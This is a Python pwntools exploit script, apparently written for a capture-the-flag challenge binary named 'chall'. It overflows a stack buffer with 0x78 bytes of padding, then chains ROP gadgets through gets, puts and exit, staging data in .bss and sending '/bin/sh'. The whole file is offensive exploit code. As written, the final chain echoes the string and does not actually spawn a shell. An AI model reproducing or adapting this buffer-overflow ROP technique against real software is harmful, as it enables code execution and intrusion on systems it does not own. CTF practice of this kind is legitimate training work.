#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_bss = elf.bss()

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 
# addr_leave_ret = rop.find_gadget(["leave", "ret"])

stack_size = 0x800
base_stage = addr_bss + stack_size

target = process("./chall")

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_puts)
buf += p64(addr_plt_exit)

_ = input()
target.sendline(buf)
target.sendline(b"/bin/sh\x00")

target.interactive()